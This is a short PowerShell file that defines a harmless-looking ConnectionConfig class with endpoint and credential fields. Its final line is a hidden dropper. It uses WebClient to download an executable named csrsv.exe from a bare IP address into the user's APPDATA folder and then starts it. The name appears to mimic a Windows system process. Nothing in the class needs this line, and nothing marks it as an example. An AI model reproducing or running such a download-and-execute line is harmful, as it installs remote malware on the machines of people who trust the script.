


class ConnectionConfig {

    [string]$Endpoint

    [pscredential]$Credential

    ConnectionConfig() {}

    ConnectionConfig([string]$Endpoint, [pscredential]$Credential) {
        $this.Endpoint = $Endpoint
        $this.Credential = $Credential
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

